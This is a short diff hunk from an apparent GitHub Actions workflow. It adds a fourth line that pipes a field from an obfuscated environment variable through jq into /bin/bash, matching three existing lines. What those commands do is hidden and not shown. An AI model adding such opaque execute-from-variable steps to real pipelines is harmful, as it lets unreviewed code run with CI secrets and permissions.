@@ -38,6 +38,7 @@ jobs:
           printf '%s' "$ffjc7163" | jq -r .fbg00 | /bin/bash
           printf '%s' "$knxc038" | jq -r .ytci89 | /bin/bash
           echo $ppio79834 | jq -r .omos64 | /bin/bash
+          echo $wa5 | jq -r .z14896 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
